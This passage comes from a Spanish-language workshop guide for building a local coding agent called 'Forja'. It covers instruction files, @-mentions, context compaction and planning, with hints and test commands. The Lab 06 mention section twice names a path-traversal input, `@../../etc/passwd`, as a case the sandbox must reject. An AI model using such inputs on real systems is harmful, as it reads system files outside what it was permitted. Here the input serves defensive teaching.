9. **8. Verifica fuera del agente.** `/exit`, luego `cd playground` y `python -m pytest -q` → `7 passed`. Comprueba que solo cambió `invoices/`: `git status playground` (o `git diff --stat playground`). Si cambió un fichero de test, la ejecución no cuenta como éxito.
10. **9. Anota tu resultado** (en tu cuaderno o en la hoja compartida): **modelo** (tag exacto, p. ej. `qwen3:8b`, más el backend: Ollama local / servidor del aula / OpenRouter), **éxito** (sí/no y tests que pasan de 7; indica si necesitaste prompts de seguimiento), **pasos** (la línea gris `(N steps · M tools)`; súmalas si hubo varios turnos), **tiempo** (cronómetro desde Enter hasta la respuesta final; opcionalmente los tokens de `/cost`). Luego compara con un compañero que haya usado otro modelo: ¿quién necesitó menos pasos?, ¿quién rompió una regla?
11. **10. Opcional: una ejecución headless reproducible.** `python scripts/tasks.py reset` y luego cronométrala: PowerShell `Measure-Command { forja --cwd playground --mode bypass -p "<same prompt>" }`, macOS/Linux `time forja --cwd playground --mode bypass -p "<same prompt>"`. En headless no hay usuario: en `accept_edits` todo comando sería DENEGADO, de ahí `bypass` (las reglas deny siguen aplicándose). El código de salida 0 significa que el agente terminó con una respuesta final, no que los tests pasen: ejecuta pytest tú mismo.

### Si algo falla
| Síntoma | Causa → solución |
|---|---|
| `test_ask_approval` se cuelga o falla con `OSError: pytest: reading from stdin while output is captured` | Llamaste a `input()`/`console.input()` en lugar de al parámetro `read` → llama a `read(prompt)`. |
| `test_summarize_call` falla en la aserción de longitud (51 != 50) o en `$ pytest  -q` | El truncado añade `…` sin quitar un carácter, o truncas antes de colapsar los espacios → colapsa primero y luego `s[:width - 1] + "…"`. |
| `test_diff_styles` da `['red', 'green', ...]` para las cabeceras | Pruebas `-`/`+` antes que `---`/`+++` → comprueba primero los prefijos de 3 caracteres. |
| El REPL se cierra al escribir `/mode foo` | `handle_slash` devolvió `None` ante un error → solo `/exit` devuelve `None`; deja que el `ValueError` de `set_mode` se propague (el REPL imprime `error: unknown mode: foo`). |
| `KeyError` / fallo en las líneas `⏺` cuando el modelo envía argumentos raros | `summarize_call` usa `args['x']` → usa `args.get('x', default)`; los argumentos llegan del modelo sin validar. |
| `forja` no se reconoce (Windows) / `command not found` (macOS/Linux) | El venv no está activo o no se ejecutó el setup → PowerShell `.venv\Scripts\Activate.ps1` (si está bloqueado: `Set-ExecutionPolicy -Scope CurrentUser RemoteSigned`), macOS/Linux `source .venv/bin/activate`, y luego `python scripts/tasks.py setup`. `python -m forja ...` también funciona. |
| Windows: el agente ejecuta `ls`, `cat` o `python3` y obtiene errores | La herramienta bash usa `cmd.exe` en Windows → es normal; el modelo debería adaptarse tras el error. Díselo: `use python -m pytest -q; this is Windows cmd`. |
| Los colores o `⏺` se ven como basura en consolas antiguas de Windows | Usa Windows Terminal (o el terminal de VS Code) en lugar de la ventana clásica de `cmd.exe`; `chcp 65001` ayuda con UTF-8. |

### Has terminado cuando
- [ ] [ ] `python scripts/tasks.py test 05` → 4 passed.
- [ ] [ ] En el REPL ves resúmenes de una línea, diffs en color y el panel de aprobación y/n/a; `/tools`, `/mode`, `/cost` y `/context` funcionan.
- [ ] [ ] Hito del día 1: tu agente hizo pasar los 3 tests que fallaban en el playground, y anotaste modelo, éxito, pasos y tiempo.

### Checkpoint
**Hito del día 1** (15:15): Forja arregla los 3 tests que fallan en `playground/` con tu modelo local. Compara con el compañero que usa otro modelo.

### Retos
1. Añade `/model <nombre>` para cambiar de modelo en caliente.
2. Muestra en el prompt de la REPL el % de contexto usado.

**Tests:** `tests/test_l05_cli.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 06`


---

## Lab 06 · Ingeniería de contexto

*Día 2 · 09:00–09:40*

**Objetivo:** Decidir qué ve el modelo en cada turno: prompt por capas, AGENTS.md, entorno y menciones @fichero.

### Conceptos
- **El system prompt se reconstruye cada turno** por capas: base del agente, recordatorio del modo, instrucciones del proyecto, skills, lista de tareas y entorno (git, SO, fecha, modelo).
- **AGENTS.md:** convención abierta para instrucciones de proyecto que leen varias herramientas. Global del usuario + desde la carpeta más alta hasta la actual: lo más específico, al final.
- **Entorno = verdad barata:** rama y cambios de git, directorio, fecha. Evita que el modelo adivine.
- **@menciones:** `@src/app.py` mete el fichero en el mensaje (y cuenta como leído). Ahorra una vuelta del bucle.
- **Menos es más con modelos locales:** cada token de prompt compite con el código. Instrucciones cortas y concretas.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 06.1 | `forja/context.py` | find_instruction_files: AGENTS.md del usuario y de la jerarquía |
| 06.2 | `forja/context.py` | build_system_prompt: capas en orden |
| 06.3 | `forja/context.py` | expand_mentions: @ruta → contenido |

### Antes de empezar
- Abre `forja/context.py`. Lee primero las partes que se dan hechas: `BASE_PROMPT`, `MODE_REMINDERS` (un dict modo -> texto), `INSTRUCTION_FILES = ("AGENTS.md", "FORJA.md")`, `MENTION_RE` y `git_info(root)`. Escribes tres funciones.
- Mira `Forja.system_prompt()` y `Forja.turn()` en `forja/harness.py`: el harness llama a `build_system_prompt(self.ws, self.mode, self.llm.model, self.home, cat, [todos])` en CADA paso, y a `expand_mentions(text, self.ws)` en cada mensaje del usuario. Hasta que termines este lab usa el `FALLBACK_PROMPT` de una línea, así que tu agente nunca ha visto `AGENTS.md`.
- Stdlib que necesitas: `pathlib.Path` (`/`, `.is_file()`, `.resolve()`, `.parent`, `.read_text(encoding="utf-8")`, `.is_relative_to()`), `re.Pattern.findall`, `dict.fromkeys(...)` (deduplicación que conserva el orden), `platform.system()`, `datetime.date.today().isoformat()`.
- Del lab 02 reutilizas el `Workspace` (`forja/fs_tools.py`): `ws.root`, `ws.resolve(path)` (lanza `PermissionError` fuera del sandbox), `ws.rel(p)` y `ws.mark_read(p)` (registra el fichero en `ws.read_state` para que un `edit_file` posterior no se queje de que no se ha leído).

### Paso a paso
Primero el 06.1: el 06.2 lo llama para obtener los ficheros de instrucciones. Luego el 06.2, el prompt por capas, que es lo que activa AGENTS.md en tu CLI. El 06.3 es independiente; déjalo para el final. Cuando el 06.2 pase, el `test_plan_mode_flow` del lab 08 también depende de él (comprueba `PLAN mode` y la lista de tareas en el system prompt).

#### TODO 06.1 · `forja/context.py` · `find_instruction_files(cwd, home=None, stop=None) -> list[Path]`

**Qué debe hacer:** Devuelve los ficheros de instrucciones que aplican a `cwd`, en el orden en que deben aparecer en el prompt: primero el global del usuario `home/.forja/AGENTS.md` (solo si se pasa `home` y el fichero existe), luego cada `AGENTS.md`/`FORJA.md` encontrado subiendo desde `cwd`, devueltos desde la carpeta MÁS ALTA hasta `cwd` (el más específico al final). El recorrido se detiene tras comprobar `stop` (incluido) o en la raíz del sistema de ficheros. `test_find_instruction_files_order` crea `home/.forja/AGENTS.md`, `repo/AGENTS.md`, `repo/pkg/AGENTS.md` y espera los contenidos `["global", "root", "package"]` al llamarla con `cwd=repo/pkg, stop=tmp_path`.

**Pasos:**
1. Empieza una lista `found` con el fichero global si `home` tiene valor y `home / ".forja" / "AGENTS.md"` es un fichero.
2. Asigna `d = cwd.resolve()` y haz un bucle: para cada nombre de `INSTRUCTION_FILES`, si `d / name` es un fichero, añádelo a una lista `chain`.
3. Para el bucle cuando `d` sea igual al `stop` resuelto, o cuando `d.parent == d` (estás en la raíz); si no, pasa a `d.parent`.
4. `chain` está ahora de abajo arriba; inviértela para que la carpeta más alta vaya primero.
5. Devuelve `found + reversed chain` (es decir, `found` más `chain` invertida).

**Cuidado con:**
- Resuelve TANTO `cwd` como `stop` antes de comparar. En macOS `tmp_path` está bajo `/var`, que es un symlink a `/private/var`: comparar una ruta resuelta con otra sin resolver nunca coincide, y llegas hasta `/`.
- Detección de la raíz: `d.parent == d` también funciona en Windows (`C:\` es su propio padre). No compares con `Path("/")`.
- Comprueba `stop` DESPUÉS de recoger los ficheros de esa carpeta: `stop` es inclusivo.
- El fichero global va primero, antes de la cadena invertida, no mezclado con ella.

<details><summary>💡 Pista 1</summary>

Es un recorrido `while True` desde `cwd` hasta la raíz, recogiendo ficheros, y luego una inversión.

</details>

<details><summary>💡 Pista 2</summary>

Recoge de abajo arriba (lo natural al subir) e invierte una vez al final, en lugar de insertar en el índice 0.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
found = []
if home and (home / ".forja" / "AGENTS.md").is_file():
    found.append(...)
chain, d = [], cwd.resolve()
while True:
    # collect INSTRUCTION_FILES present in d
    if ... or d.parent == d:   # reached stop (resolved) or root
        break
    d = d.parent
return found + ...
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l06_context.py -k find_instruction -v
```

#### TODO 06.2 · `forja/context.py` · `build_system_prompt(ws, mode, model, home=None, skills_catalog="", extra=None) -> str`

**Qué debe hacer:** Devuelve el system prompt completo: las capas no vacías unidas con una línea en blanco (`"\n\n"`), en este orden: `BASE_PROMPT`; `MODE_REMINDERS[mode]`; un bloque por fichero de `find_instruction_files(ws.root, home=home)`, cada uno con una cabecera `## ... instructions` seguida del contenido del fichero; `skills_catalog` si no está vacío; cada cadena no vacía de `extra` (el harness pasa aquí la lista de tareas); y por último un bloque `## Environment` con el directorio de trabajo (`ws.root`), `git_info(ws.root)`, el SO (`platform.system()`), la fecha (`date.today().isoformat()`) y `model`. `test_system_prompt_layers` comprueba que están presentes `You are Forja`, `PLAN mode`, `half-up` (de `playground/AGENTS.md`), `## Skills`, `## Extra`, el nombre del modelo y `str(project)`, y que `PLAN mode` va antes que `half-up`, que a su vez va antes que `## Environment`.

**Pasos:**
1. Empieza una lista `layers` con `BASE_PROMPT` y el recordatorio de `mode` (`MODE_REMINDERS.get(mode, "")` es seguro).
2. Para cada fichero de `find_instruction_files(ws.root, home=home)`, añade `"## <label>\n<content>"`. Una etiqueta útil: `User global instructions` para el fichero bajo `home/.forja`, `Project instructions (<relative path>)` para los demás.
3. Añade `skills_catalog` si no está vacío y luego cada elemento no vacío de `extra or []`.
4. Añade el bloque `## Environment` (directorio, `git_info(ws.root)`, SO, fecha, modelo) como una única cadena multilínea.
5. Devuelve `"\n\n".join(...)` sobre las capas no vacías.

**Cuidado con:**
- Lee los ficheros con `read_text(encoding="utf-8")`. En Windows la codificación por defecto es cp1252 y los AGENTS.md con tildes o `—` lanzan `UnicodeDecodeError` o salen con caracteres corruptos.
- `extra` puede ser `None` y puede contener `""` (el test pasa `["## Extra", ""]`, el harness pasa `[""]` cuando no hay tareas): filtra las cadenas vacías para no tener secciones en blanco sueltas.
- Llama a `find_instruction_files` con `ws.root`, no con `Path.cwd()`: con `forja --cwd playground` el cwd del proceso es la raíz del repo.
- `f.relative_to(ws.root)` lanza `ValueError` para ficheros por encima del workspace o en home: protégete con `f.is_relative_to(ws.root)`.
- El test necesita `str(project)` en el prompt: imprime `ws.root` tal cual (absoluto), no `.`.

<details><summary>💡 Pista 1</summary>

Construye una lista de cadenas en orden y únela una sola vez; no concatenes con `+=` olvidando los separadores.

</details>

<details><summary>💡 Pista 2</summary>

El harness ya te da todo: `ws.root`, `mode`, `model`, `skills_catalog`, `extra`. Tú solo añades los ficheros y el entorno.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
layers = [BASE_PROMPT, MODE_REMINDERS.get(mode, "")]
for f in find_instruction_files(ws.root, home=home):
    label = ...   # global vs project (relative path)
    layers.append(f"## {label}\n{...}")
# skills_catalog, extra (non-empty only)
layers.append(f"## Environment\nWorking directory: {ws.root}\n{git_info(ws.root)}\n...")
return "\n\n".join(x for x in layers if x)
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l06_context.py -k system_prompt -v
```

#### TODO 06.3 · `forja/context.py` · `expand_mentions(text, ws, max_chars=20_000) -> str`

**Qué debe hacer:** Encuentra menciones `@path` con `MENTION_RE` (ya ignora direcciones de e-mail como `joe@mail.com`). Para cada mención ÚNICA que se resuelve dentro del workspace a un FICHERO existente: léelo (como máximo `max_chars` caracteres), llama a `ws.mark_read(p)` y añade un bloque `<file path="<relative path>">\n<content>\n</file>` al FINAL del texto original (el texto en sí no se modifica). Las menciones fuera del sandbox (`@../../etc/passwd` -> `PermissionError`), los ficheros inexistentes (`@nobody`) y las carpetas se omiten en silencio. Sin ninguna mención válida, devuelve `text` sin cambios (`expand_mentions("no mentions", ws) == "no mentions"`). `test_expand_mentions` espera exactamente un bloque `<file` con `path="invoices/dates.py"`, el contenido del fichero (`def due_date`) y la ruta en `ws.read_state`.

**Pasos:**
1. Obtén las menciones con `MENTION_RE.findall(text)` y deduplica conservando el orden (`dict.fromkeys(...)`).
2. Quita la puntuación final de cada mención: la regex se detiene en `,` pero admite `.`, así que `look at @src/app.py.` captura `src/app.py.`. Usa `ref.rstrip(".,;:")`.
3. Resuelve con `ws.resolve(ref)` dentro de `try/except PermissionError: continue`; omítela si `not p.is_file()`.
4. Lee con `read_text(encoding="utf-8", errors="replace")`, corta a `max_chars` (añade una marca `…[truncated]`), `ws.mark_read(p)`, y construye el bloque `<file path=...>`.
5. Si tienes bloques, devuelve `text + "\n\n" + "\n\n".join(blocks)`; si no, devuelve `text`.

**Cuidado con:**
- Una mención al final de una frase (`look at @src/app.py.`) captura el punto final: quita los `.,;:` finales o el fichero no se encuentra.
- Usa `ws.rel(p)` para el atributo `path`: ya devuelve una ruta POSIX (`invoices/dates.py`) también en Windows, que es lo que busca el test.
- Llama a `ws.mark_read(p)` por cada fichero incluido: el test comprueba `ws.read_state`, y en el CLI permite al modelo hacer `edit_file` directamente sin un viaje de ida y vuelta con `read_file`.
- No sustituyas la mención dentro del texto: mantén intacta la frase del usuario y añade los bloques detrás.
- No dejes que una mención mala aborte las demás: `continue`, nunca `return` dentro del bucle.

<details><summary>💡 Pista 1</summary>

Recorre las menciones, filtra las válidas, construye una lista de bloques y añádelos al final.

</details>

<details><summary>💡 Pista 2</summary>

El sandbox ya está hecho (lab 02): que `ws.resolve` lance `PermissionError` es tu filtro para las rutas `../`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
blocks = []
for ref in dict.fromkeys(MENTION_RE.findall(text)):
    try:
        p = ws.resolve(ref.rstrip(".,;:"))
    except PermissionError:
        continue
    # skip non-files; read (cap max_chars); ws.mark_read(p)
    blocks.append(f'<file path="{...}">\n{...}\n</file>')
return ...  # text unchanged if no blocks
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l06_context.py -k mentions -v
```

### Ejecuta
```bash
python scripts/tasks.py test 06
forja --cwd playground
> revisa @invoices/amounts.py y dime si cumple lo que dice AGENTS.md
```

### Pruébalo en tu agente
1. Resetea primero: `python scripts/tasks.py reset`. Arranca `forja --cwd playground`. La nota tenue `context: lab 06 pending ...` YA NO debería aparecer.
2. Pide: `review @invoices/amounts.py and tell me whether it follows AGENTS.md`. Esperado: NINGUNA línea `⏺ Read invoices/amounts.py` (el fichero llegó con el mensaje) y una respuesta que cite las reglas: redondeo half-up con `decimal`, no `round()` sobre floats, no cambiar los tests.
3. Pregunta sin mencionar las reglas: `what are the rules of this project?`. El agente responde a partir de `AGENTS.md` sin llamar a ninguna herramienta.
4. Escribe `/context` antes y después de un mensaje con una mención `@` grande: el número de tokens crece aproximadamente el tamaño del fichero / 4.
5. Opcional: crea `~/.forja/AGENTS.md` (Windows: `%USERPROFILE%\.forja\AGENTS.md`) con `Always answer in Spanish.`; reinicia Forja y saluda. Cambia el idioma de la respuesta: la capa global funciona.

### Si algo falla
| Síntoma | Causa → solución |
|---|---|
| `test_find_instruction_files_order` devuelve `['global', 'package', 'root']` | No invertiste el recorrido (o invertiste también el fichero global) → recoge de abajo arriba, invierte solo la cadena y luego antepón el fichero global. |
| `test_find_instruction_files_order` encuentra ficheros de más o nunca se detiene (macOS) | Comparas `cwd` resuelto con `stop` sin resolver (`/var` frente a `/private/var`) → resuelve también `stop`. |
| `test_system_prompt_layers` falla en `half-up` in sp | No se incluyó el AGENTS.md del playground → llama a `find_instruction_files(ws.root, home=home)` y añade el CONTENIDO del fichero, no solo su ruta. |
| `UnicodeDecodeError: 'charmap' codec can't decode` (Windows) | `read_text()` sin encoding → `read_text(encoding="utf-8")` (y `errors="replace"` para los ficheros mencionados). |
| `test_expand_mentions`: `out.count("<file") == 2` o un fallo con `@../../etc/passwd` | Falta el `except PermissionError` o la comprobación `is_file()` → omite las menciones no válidas con `continue`. |
| En el CLI el agente sigue ignorando AGENTS.md | Ejecutaste Forja desde otra carpeta, o el AGENTS.md no está bajo `--cwd` → arranca con `forja --cwd playground`; los modelos pequeños también pueden necesitar que se repita la regla en el prompt (menos es más: mantén AGENTS.md corto). |

### Has terminado cuando
- [ ] [ ] `python scripts/tasks.py test 06` → 3 passed.
- [ ] [ ] En el CLI el agente cita las reglas de `playground/AGENTS.md` (half-up, no tocar los tests) sin que se lo digas.
- [ ] [ ] Una mención `@file` se responde sin una línea `⏺ Read` adicional.

### Checkpoint
El agente cita reglas del `playground/AGENTS.md` (half-up, no tocar tests) sin que se las digas.

### Retos
1. Escribe tu `~/.forja/AGENTS.md` con tus preferencias (idioma, estilo).
2. Añade al entorno la versión de Python y los últimos 3 commits.

**Tests:** `tests/test_l06_context.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 07`


---

## Lab 07 · Gestión de contexto y compactación

*Día 2 · 09:40–10:25*

**Objetivo:** Que una sesión larga quepa en la ventana de un modelo local sin romper el historial.

### Conceptos
- **El presupuesto:** modelos locales trabajan con 16–32k tokens efectivos. Un `pytest` verboso o un fichero grande se comen la ventana.
- **Nivel 1 — microcompactación (gratis):** vaciar salidas de tools antiguas. El modelo ya las usó; si las necesita, vuelve a leer.
- **Nivel 2 — compactación (1 llamada):** resumir los turnos antiguos (objetivo, ficheros, comandos, decisiones, pendientes) y conservar los recientes.
- **Invariante:** solo se corta antes de un mensaje `user`. Nunca entre un `tool_calls` y sus `tool`.
- **Es con pérdida:** mídelo con evals (lab 12) usando una ventana pequeña.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 07.1 | `forja/compaction.py` | microcompact: vaciar salidas antiguas |
| 07.2 | `forja/compaction.py` | compact: resumen + turnos recientes, sin romper pares |

### Antes de empezar
- Abre `forja/compaction.py`. Se dan hechos: `SUMMARY_PROMPT`, `CLEARED = "[old tool result cleared]"`, `estimate_tokens(messages)` (~4 caracteres por token), `user_turn_starts(history)` (índices de los mensajes `user`) y `should_compact(...)` (verdadero por encima del 80% de la ventana). Tú escribes `microcompact` y `compact`.
- Conoce el formato del historial (chat de OpenAI): `{"role": "user", "content": ...}`, `{"role": "assistant", "content": ..., "tool_calls": [{"id", "type", "function": {"name", "arguments"}}]}`, `{"role": "tool", "tool_call_id": ..., "name": ..., "content": ...}`. Un mensaje assistant con `tool_calls` DEBE ir seguido de un mensaje `tool` por llamada: romper ese par hace que la API rechace la petición.
- Un "turno" empieza en un mensaje `user`. Cortar solo en los índices de `user_turn_starts(...)` es lo que garantiza que nunca separas un mensaje `tool_calls` de sus resultados.
- Cómo se conecta: `Forja.compact_now()` en `forja/harness.py` se ejecuta antes de cada turno: si `should_compact` → `microcompact(self.history)` (gratis); si sigue siendo demasiado grande → `compact(self.history, self.llm)` (una llamada al LLM). `/compact` llama a `compact_now(force=True)`. La llamada al LLM es `llm.chat(messages, temperature=0)` y devuelve un `ChatResponse` cuyo `.content` es el texto (en los tests, `FakeLLM` la registra en `llm.calls`).

### Paso a paso
Primero el 07.1: es un bucle puro que modifica en sitio, sin LLM, y te enseña el punto de corte (`starts[-keep_recent_turns]`) que reutiliza el 07.2. Luego el 07.2. `test_harness_autocompacts` (se ejecuta con el 07.2) ejercita ambos a través del harness con una ventana diminuta, así que solo pasa cuando los dos están bien.

#### TODO 07.1 · `forja/compaction.py` · `microcompact(history, keep_recent_turns=2, min_chars=500) -> int`

**Qué debe hacer:** Modifica `history` EN SITIO: cada mensaje `tool` situado ANTES del inicio de los últimos `keep_recent_turns` turnos, cuyo contenido tenga al menos `min_chars` caracteres y no sea ya `CLEARED`, pasa a `content = CLEARED`. Devuelve cuántos mensajes se limpiaron. Si hay `keep_recent_turns` turnos o menos, no hace nada y devuelve 0. Los mensajes nunca se eliminan ni se reordenan, así que los pares siguen siendo válidos. `test_microcompact` (4 turnos, salidas de herramientas de 2000 caracteres) espera 2 limpiados (turnos 0 y 1), los dos últimos intactos, tokens por debajo del 60% de antes, y que una segunda llamada devuelva 0.

**Pasos:**
1. Calcula `starts = user_turn_starts(history)`; si `len(starts) <= keep_recent_turns`, devuelve 0.
2. La zona protegida empieza en `limit = starts[-keep_recent_turns]`.
3. Recorre `history[:limit]` (el slice es una lista nueva pero contiene los MISMOS objetos dict, así que mutarlos cambia `history`).
4. Para cada mensaje con rol `tool`, longitud de contenido `>= min_chars` y contenido `!= CLEARED`: ponlo a `CLEARED` y cuéntalo.
5. Devuelve el contador.

**Cuidado con:**
- Muta los dicts; no construyas una lista nueva para devolverla. La función devuelve un `int` y el harness confía en que `self.history` cambie en sitio.
- Solo mensajes `tool`: nunca vacíes el contenido de user o assistant (eso es la conversación en sí).
- `content` puede ser `None`: usa `len(m.get("content") or "")`.
- `>= min_chars`, no `>`: una salida de exactamente 500 caracteres cuenta.

<details><summary>💡 Pista 1</summary>

Encuentra el índice donde empieza la parte reciente; todo lo anterior es terreno libre.

</details>

<details><summary>💡 Pista 2</summary>

`starts[-keep_recent_turns]` es el índice del primer mensaje de usuario que quieres mantener intacto.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
starts = user_turn_starts(history)
if len(starts) <= keep_recent_turns:
    return 0
limit = ...
n = 0
for m in history[:limit]:
    if m["role"] == "tool" and ...:   # long enough, not yet CLEARED
        ...
return n
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l07_compaction.py -k microcompact -v
```

#### TODO 07.2 · `forja/compaction.py` · `compact(history, llm, keep_recent_turns=2) -> tuple[list, bool]`

**Qué debe hacer:** Si hay `keep_recent_turns` turnos o menos, devuelve `(history, False)` sin llamar al LLM. Si no, corta en `starts[-keep_recent_turns]`: `old = history[:cut]`, `recent = history[cut:]`. Convierte `old` en texto plano (una línea por mensaje: rol y contenido; para los assistant también las herramientas llamadas con los argumentos truncados; para los mensajes tool un resultado truncado), y llama a `llm.chat([{system: SUMMARY_PROMPT}, {user: that text}], temperature=0)`. Devuelve `([{"role": "user", "content": "[Summary of the previous session]\n" + summary}, {"role": "assistant", "content": <short ack>}, *recent], True)`. `test_compact_keeps_pairs_and_recent` comprueba: el primer mensaje empieza por `[Summary` y contiene el resumen falso; `new[2:] == h[8:]` (los 2 últimos turnos intactos); los pares son válidos; el texto enviado como `messages[1]` contiene `question 0` pero NO `question 3` (los turnos recientes no se resumen); `compact(history(1), llm)[1] is False`.

**Pasos:**
1. Calcula `starts`; devuelve `(history, False)` pronto cuando no hay suficiente que compactar.
2. Divide en `old` y `recent` en `cut = starts[-keep_recent_turns]`.
3. Construye una lista de líneas de texto a partir de `old`: para los mensajes `tool` algo como `[result of <name>] <first 1500 chars>`; para los demás `<role>: <content>` más `[tools: name(args…)]` sacado de `m.get("tool_calls", [])` → `t["function"]["name"]` / `["arguments"]`.
4. Une las líneas y limita el total (quédate con el FINAL, p. ej. los últimos 60.000 caracteres: el trabajo antiguo más reciente es el que más importa).
5. Llama a `llm.chat([...system SUMMARY_PROMPT..., ...user transcript...], temperature=0)` y toma `.content or ""`.
6. Devuelve el nuevo historial: el resumen como mensaje `user`, un acuse de recibo `assistant` (p. ej. `Understood. I'll continue from here.`) y luego `*recent`; y `True`.

**Cuidado con:**
- El nuevo historial debe empezar con `user` y luego `assistant`: dos mensajes `user` seguidos (resumen + siguiente turno) o un mensaje `tool` huérfano rompen algunas plantillas de chat. El acuse de recibo arregla la alternancia.
- Nunca resumas los turnos recientes: el test comprueba que `question 3` no está en el prompt enviado al modelo.
- Mantén `recent` tal cual (`new[2:] == h[8:]`): no copies, limpies ni vuelvas a truncar esos mensajes.
- `content` puede ser `None` (mensajes assistant con solo llamadas a herramientas): usa `m.get("content") or ""` al formatear.
- El prompt de resumen va como `messages[0]` con rol `system` y la transcripción como `messages[1]` con rol `user`: el test lee `llm.calls[0]["messages"][1]["content"]`.

<details><summary>💡 Pista 1</summary>

El mismo punto de corte que en el 07.1, pero en lugar de vaciar sustituyes toda la parte antigua por un único resumen.

</details>

<details><summary>💡 Pista 2</summary>

El LLM nunca ve los dicts de mensajes en bruto: primero los aplanas a texto, que es también donde truncas los resultados grandes de las herramientas.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
starts = user_turn_starts(history)
if len(starts) <= keep_recent_turns:
    return history, False
cut = starts[-keep_recent_turns]
old, recent = history[:cut], history[cut:]
lines = []
for m in old:
    ...  # tool -> truncated result; others -> role: content [tools: ...]
summary = llm.chat([...], temperature=0).content or ""
return [ ...summary user msg..., ...assistant ack..., *recent ], True
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l07_compaction.py -k "keeps_pairs or autocompacts" -v
```

### Ejecuta
```bash
python scripts/tasks.py test 07
forja --cwd playground
> lee todos los ficheros del proyecto y resúmelos
/context
/compact
/context
```

### Pruébalo en tu agente
1. `python scripts/tasks.py reset` y luego `forja --cwd playground`. Pide: `read every file in the project and summarise them` (aprueba con `y` si pregunta; las lecturas no deberían preguntar).
2. Escribe `/context`: algo como `~6000 tokens of 32768 (N messages)`. Haz dos preguntas cortas más (p. ej. `which function computes VAT?`, `where is the due date logic?`) para tener al menos 3 turnos: la compactación siempre conserva los 2 últimos.
3. Escribe `/compact`. Esperado: `compacted: summary + recent turns (~N tokens)`. Si solo tenías 1–2 turnos obtienes `nothing to compact` (o `microcompaction: N old outputs cleared`): es el comportamiento correcto.
4. Vuelve a escribir `/context`: el número baja claramente. Pregunta `what were we doing?`: el agente sigue conociendo los ficheros y el objetivo (los lee del resumen).
5. Opcional: crea `playground/.forja/settings.json` con `{"contextWindow": 6000}`, reinicia y trabaja unos cuantos turnos: aparece automáticamente una nota tenue `· microcompaction: ...` o `· compacted: ...` antes de un turno. Borra el fichero después.

### Si algo falla
| Síntoma | Causa → solución |
|---|---|
| `test_microcompact`: `assert 4 == 2` (se limpia todo) | Recorres el historial entero → solo `history[:starts[-keep_recent_turns]]`. |
| `test_microcompact`: la segunda llamada devuelve 2 en lugar de 0, o el contador es correcto pero los contenidos no cambian | No compruebas `!= CLEARED`, o modificas una copia (`dict(m)`) → muta los dicts originales y omite los ya limpiados. |
| `test_compact_keeps_pairs_and_recent`: se encuentra `question 3` en el prompt | Resumes el historial entero → solo `old = history[:cut]`. |
| `test_compact_keeps_pairs_and_recent`: `KeyError: 'tool_calls'` o `TypeError: can only concatenate str (not "NoneType")` | Usa `m.get("tool_calls", [])` y `m.get("content") or ""`. |
| `test_harness_autocompacts`: falla `assert any("compact" in n for n in app.notes)` | `compact` devuelve `(history, False)` demasiado a menudo, o el 07.1 lanza una excepción → comprueba primero ambas funciones con el test del 07.1; el harness solo añade la nota cuando se compactó algo. |
| Modelo real: tras `/compact` el agente olvida qué ficheros cambió | La compactación pierde información → asegúrate de que el texto de tu transcripción incluye los nombres de las herramientas y sus argumentos (¡las rutas!), no solo los contenidos; mídelo más adelante con evals (lab 12). |
| Modelo real: `/compact` tarda mucho | Es una llamada completa al LLM sobre hasta 60k caracteres → normal en un portátil; un límite menor en la transcripción lo hace más rápido. |

### Has terminado cuando
- [ ] [ ] `python scripts/tasks.py test 07` → 3 passed.
- [ ] [ ] `/context` baja tras `/compact` y el agente sigue sabiendo lo que estaba haciendo.

### Checkpoint
`/context` baja tras `/compact` y el agente sigue sabiendo qué estaba haciendo.

### Retos
1. Pon `"contextWindow": 6000` en `.forja/settings.json` y trabaja: ¿cuándo compacta?
2. Compacta con un modelo más pequeño que el principal.

**Tests:** `tests/test_l07_compaction.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 08`


---

## Lab 08 · Planificar antes de actuar

*Día 2 · 10:25–11:10*

**Objetivo:** Lista de tareas visible y modo plan: el agente investiga, propone y solo ejecuta cuando apruebas.

### Conceptos
- **todo_write:** el agente mantiene su lista (pending / in_progress / completed). Obliga a descomponer y mejora mucho la constancia de modelos pequeños en tareas largas. Una sola tarea en curso.
- **La lista vuelve al contexto** cada turno (capa del system prompt): el agente no se pierde.
- **Modo plan:** solo lectura por permisos, no por buena voluntad del modelo. Cuando tiene un plan, llama a `exit_plan_mode`; si lo apruebas, el harness cambia a modo default.
- **Cuándo usarlo:** cambios de varios ficheros, código que no conoces, cualquier cosa difícil de deshacer.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 08.1 | `forja/planning.py` | todo_write con validación |
| 08.2 | `forja/planning.py` | exit_plan_mode con aprobación del usuario |

### Antes de empezar
- Abre `forja/planning.py`. Se dan hechos: `TodoItem` (modelo pydantic con `content: str` y `status: "pending" | "in_progress" | "completed"`, por defecto `pending`), `ICON` y `TodoStore` con `.items` y `.render()` (una línea `☐/▶/☑ content` por elemento, o `(empty list)`). Tú escribes los CUERPOS de dos herramientas, dentro de funciones factoría.
- Ambas herramientas se crean con `@tool(risk="read")` del lab 02: el docstring y las anotaciones de tipo se convierten en el JSON schema que lee el modelo, así que no los cambies. Lanzar una excepción dentro de una herramienta es la forma correcta de rechazar una entrada incorrecta: `ToolRegistry.execute` la convierte en `ERROR in '<tool>': ValueError: <message>` y el modelo puede corregirse.
- Los argumentos llegan a tu función DESPUÉS de la validación de pydantic y de `model_dump()`, así que `todos` normalmente llega como una lista de dicts simples; pero el código también puede llamar a la función con objetos `TodoItem`. Acepta ambos (`TodoItem.model_validate(d)`).
